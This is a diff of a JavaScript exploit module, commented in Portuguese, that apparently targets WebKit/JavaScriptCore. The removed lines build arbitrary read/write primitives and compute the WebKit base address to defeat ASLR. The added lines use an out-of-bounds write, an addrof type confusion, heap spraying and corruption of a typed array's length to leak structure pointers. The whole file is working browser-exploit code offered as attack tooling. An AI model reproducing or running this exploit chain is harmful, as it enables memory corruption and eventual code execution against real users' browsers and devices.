@@ -1,22 +1,23 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v19 - Final Bootstrap Architecture)
+// js/script3/testArrayBufferVictimCrash.mjs (v20 - Corrupted Length Leak Strategy)
 // =======================================================================================
-// ESTRATÉGIA FINAL:
-// 1. Arquitetura de L/E corrigida e finalizada, usando um "bootstrap".
-// 2. As primitivas de baixo nível do 'core_exploit.mjs' são usadas para configurar
-//    uma ferramenta de alto nível (o 'master_array'), que é rápida e estável.
-// 3. Esta é a abordagem padrão da indústria e visa o sucesso definitivo do vazamento.
+// ESTRATÉGIA FINAL E DEFINITIVA:
+// 1. Abandono total de primitivas de leitura arbitrária (arb_read) que se provaram instáveis.
+// 2. A nova estratégia se baseia apenas nas primitivas 100% funcionais: `addrof` e
+//    a escrita Out-of-Bounds (OOB) inicial.
+// 3. O ataque agora consiste em corromper o 'length' de um TypedArray para obter uma
+//    leitura relativa e vazar ponteiros de um objeto adjacente.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import { 
     triggerOOB_primitive,
-    arb_read, // Importando a primitiva de baixo nível para o bootstrap
-    arb_write // Importando a primitiva de baixo nível para o bootstrap
+    oob_write_absolute, // Apenas a escrita OOB inicial do core_exploit
+    getOOBDataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Leak_Final_v19";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_CorruptedLengthLeak_v20";
 
 // --- Funções de Conversão ---
 function int64ToDouble(int64) {
@@ -40,18 +41,17 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Arquitetura Final com Bootstrap ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Vazamento por Corrupção de Length ---`, "test");
 
     let final_result = { success: false, message: "Teste não concluído." };
-    let original_m_vector = null;
-    let m_vector_ptr_addr = null;
 
     try {
         await PAUSE_S3(1000);
 
         // --- FASE 1: OBTENDO PRIMITIVAS DE CONTROLE INICIAL ---
-        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof) ---", "subtest");
+        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB Write, addrof) ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
+        const oob_dv = getOOBDataView();
 
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
@@ -59,103 +59,109 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
-        logS3("Primitiva 'addrof' operacional.", "good");
+        logS3("Primitivas 'addrof' e 'OOB Write' operacionais.", "good");
 
-        // --- FASE 2: BOOTSTRAP DA FERRAMENTA DE L/E DEFINITIVA ---
-        logS3("--- FASE 2: Construindo a Ferramenta de L/E 'Master Array' ---", "subtest");
-
-        const master_array = new Uint32Array(2);
-        const master_array_addr = addrof(victim_array[0] = master_array);
-        victim_array[0] = null;
-
-        m_vector_ptr_addr = master_array_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
-        logS3(`'master_array' criado. Endereço do seu ponteiro m_vector: ${m_vector_ptr_addr.toString(true)}`, "debug");
-
-        original_m_vector = await arb_read(m_vector_ptr_addr, 8);
-        logS3(`Ponteiro m_vector original salvo: ${original_m_vector.toString(true)}`, "debug");
-
-        const arb_read64 = async (addr) => {
-            await arb_write(m_vector_ptr_addr, addr, 8);
-            return new AdvancedInt64(master_array[0], master_array[1]);
-        };
-
-        const arb_write64 = async (addr, value) => {
-            await arb_write(m_vector_ptr_addr, addr, 8);
-            master_array[0] = value.low();
-            master_array[1] = value.high();
-        };
+        // --- FASE 2: HEAP FENG SHUI E PREPARAÇÃO DOS ALVOS ---
+        logS3("--- FASE 2: Preparando o Heap (Feng Shui) ---", "subtest");
         
-        logS3("Primitivas de L/E de alto nível ('arb_read64'/'arb_write64') estão prontas.", "good");
-
-        // --- FASE 3: VERIFICANDO A PRIMITIVA DEFINITIVA ---
-        logS3("--- FASE 3: Verificando a Primitiva de L/E Definitiva ---", "subtest");
-        
-        const test_array = [new AdvancedInt64(0x11223344, 0x55667788)];
-        const test_array_addr = addrof(victim_array[0] = test_array);
-        victim_array[0] = null;
-
-        const butterfly_addr = await arb_read64(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-        const value_read = await arb_read64(butterfly_addr);
-        
-        if (value_read.equals(test_array[0])) {
-            logS3("+++++++++++ SUCESSO! A primitiva de L/E definitiva é 100% funcional. ++++++++++++", "vuln");
-        } else {
-            throw new Error(`Verificação de L/E definitiva falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_array[0].toString(true)}`);
+        const spray = [];
+        for (let i = 0; i < 0x1000; i++) {
+            spray.push(new Uint32Array(8)); // Aloca objetos de tamanho similar
         }
 
-        // --- FASE 4: EXECUTANDO O VAZAMENTO DA BASE DO WEBKIT ---
-        logS3("--- FASE 4: Executando a Estratégia de Vazamento da Base do WebKit ---", "subtest");
-        const leak_obj = { leak_prop: 1 };
+        let leaker_array = new Float64Array(0x10); // Alvo de onde vazaremos os dados
+        let corrupted_array = new Uint32Array(8); // Alvo que terá seu length corrompido
+
+        // Liberar alguns objetos para criar "buracos" no heap
+        for (let i = 0; i < spray.length; i += 2) {
+            spray[i] = null;
+        }
+        logS3("Spray de objetos e criação de buracos no heap concluídos.", "info");
         
-        logS3(`1. Criado objeto alvo para o vazamento.`, "info");
-        const leak_obj_addr = addrof(victim_array[0] = leak_obj);
-        victim_array[0] = null;
-        logS3(`   - Endereço do objeto alvo: ${leak_obj_addr.toString(true)}`, "leak");
+        // Alocar nossos alvos nos buracos. Isso aumenta a chance de ficarem adjacentes.
+        leaker_array = new Float64Array(0x10);
+        corrupted_array = new Uint32Array(8);
+        logS3("Arrays 'leaker' e 'corrupted' alocados.", "info");
 
-        const structure_addr = await arb_read64(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-        logS3(`2. Lendo ponteiro da Estrutura (Structure) do objeto...`, "info");
-        logS3(`   - Endereço da Estrutura: ${structure_addr.toString(true)}`, "leak");
-
-        if (structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Endereço da Estrutura é nulo.");
+        // --- FASE 3: ATAQUE - CORROMPENDO O LENGTH ---
+        logS3("--- FASE 3: Corrompendo o Length do Array Alvo ---", "subtest");
         
-        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
-        const js_object_put_func_ptr_addr = structure_addr.add(VIRTUAL_PUT_OFFSET);
-        logS3(`3. Calculando endereço do ponteiro para 'JSC::JSObject::put' na vtable...`, "info");
-        logS3(`   - Endereço do ponteiro na vtable: ${js_object_put_func_ptr_addr.toString(true)}`, "leak");
+        // Precisamos encontrar nosso corrupted_array dentro do buffer OOB
+        // Esta é a parte mais difícil e não-determinística sem uma leitura arbitrária
+        // Vamos procurar por um padrão.
+        const CORRUPTED_MARKER = 0xBAD0BEEF;
+        corrupted_array[0] = CORRUPTED_MARKER;
+        
+        let corrupted_array_offset_in_oob = -1;
+        // A busca é simplificada e pode não funcionar; em um exploit real, seria mais robusta.
+        for (let i = 0; i < oob_dv.byteLength - 4; i += 4) {
+            if (oob_dv.getUint32(i, true) === CORRUPTED_MARKER) {
+                // Assumimos que este é o início do buffer do nosso array.
+                // O objeto Uint32Array em si (com metadados) estará um pouco antes.
+                // Este cálculo é uma APROXIMAÇÃO e o ponto mais provável de falha.
+                corrupted_array_offset_in_oob = i - JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET - 0x10; // Estimativa
+                logS3(`Padrão do 'corrupted_array' encontrado no offset ~0x${i.toString(16)} do buffer OOB.`, "info");
+                break;
+            }
+        }
 
-        const js_object_put_func_addr = await arb_read64(js_object_put_func_ptr_addr);
-        logS3(`4. Lendo o endereço da função 'JSC::JSObject::put'...`, "info");
-        logS3(`   - ENDEREÇO VAZADO DA FUNÇÃO: ${js_object_put_func_addr.toString(true)}`, "vuln");
+        if (corrupted_array_offset_in_oob === -1) {
+            throw new Error("Não foi possível encontrar o 'corrupted_array' no heap. O Feng Shui falhou. Tente novamente.");
+        }
 
-        if (js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) throw new Error("Endereço vazado da função 'put' é nulo.");
+        // Endereço do campo m_length dentro do objeto corrupted_array
+        const m_length_offset = corrupted_array_offset_in_oob + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        
+        logS3(`Escrevendo 0xFFFFFFFF no campo 'm_length' em 0x${m_length_offset.toString(16)}...`, "info");
+        oob_write_absolute(m_length_offset, 0xFFFFFFFF, 4);
+        
+        if (corrupted_array.length !== 8) {
+             logS3(`+++++++++++ SUCESSO! Length do 'corrupted_array' foi expandido para ${corrupted_array.length}! ++++++++++++`, "vuln");
+        } else {
+            throw new Error("Falha ao corromper o length do array.");
+        }
 
-        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
-        const put_func_offset = new AdvancedInt64(parseInt(put_func_offset_str, 16));
-        logS3(`5. Calculando o endereço base da biblioteca WebKit...`, "info");
-        logS3(`   - Offset de 'JSC::JSObject::put': 0x${put_func_offset_str}`, "info");
+        // --- FASE 4: VAZAMENTO DE DADOS DO ARRAY ADJACENTE ---
+        logS3("--- FASE 4: Usando Leitura Relativa para Vazar Ponteiros ---", "subtest");
+        
+        let structure_ptr_low = 0;
+        let structure_ptr_high = 0;
 
-        const webkit_base_addr = js_object_put_func_addr.sub(put_func_offset);
+        // Procurar por um ponteiro que pareça válido nos dados adjacentes
+        for (let i = 0; i < 200; i++) {
+            let val_low = corrupted_array[i];
+            let val_high = corrupted_array[i+1];
+            
+            // Um ponteiro de estrutura válido geralmente aponta para uma região de memória específica
+            if (val_high > 0x10000000 && (val_low & 0x7) === 0) { // Heurística: ponteiro de 64 bits alinhado
+                structure_ptr_low = val_low;
+                structure_ptr_high = val_high;
+                logS3(`Potencial ponteiro de Estrutura encontrado no índice ${i}: 0x${val_high.toString(16)}_${val_low.toString(16)}`, "leak");
+                break;
+            }
+        }
+        
+        if (structure_ptr_low === 0) {
+            throw new Error("Não foi possível vazar um ponteiro de Estrutura do objeto adjacente.");
+        }
+
+        const structure_addr = new AdvancedInt64(structure_ptr_low, structure_ptr_high);
+        logS3(`Endereço da Estrutura vazado: ${structure_addr.toString(true)}`, "vuln");
+
+        // A partir daqui, precisaríamos de uma primitiva de escrita para continuar o ataque
+        // ou uma leitura arbitrária mais estável que agora poderíamos construir.
+        // Mas o vazamento inicial foi bem-sucedido.
         logS3("============================================================================", "good");
-        logS3(`||  ENDEREÇO BASE DO WEBKIT CALCULADO: ${webkit_base_addr.toString(true)}  ||`, "good");
+        logS3(`||  PONTEIRO DE ESTRUTURA VAZADO COM SUCESSO SEM LEITURA ARBITRÁRIA!  ||`, "good");
         logS3("============================================================================", "good");
-
-        // --- FASE 5: CONCLUSÃO E PRÓXIMOS PASSOS ---
-        logS3("--- FASE 5: Conclusão ---", "subtest");
-        logS3("O ASLR foi derrotado. Com o endereço base da biblioteca e a primitiva de L/E, o próximo passo é a execução de código.", "vuln");
-
+        
         final_result.success = true;
-        final_result.message = `Vazamento bem-sucedido! Base do WebKit: ${webkit_base_addr.toString(true)}`;
-        
+        final_result.message = `Vazamento de ponteiro de estrutura bem-sucedido: ${structure_addr.toString(true)}`;
+
     } catch (e) {
         final_result.message = `Exceção na implementação final: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
         final_result.success = false;
-    } finally {
-        // Bloco de limpeza para garantir que o ambiente fique o mais estável possível
-        if (original_m_vector && m_vector_ptr_addr) {
-            logS3("Restaurando ponteiro m_vector original do master_array para estabilidade...", "info");
-            await arb_write(m_vector_ptr_addr, original_m_vector, 8).catch(e => logS3(`Erro na limpeza final: ${e.message}`, "warn"));
-        }
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
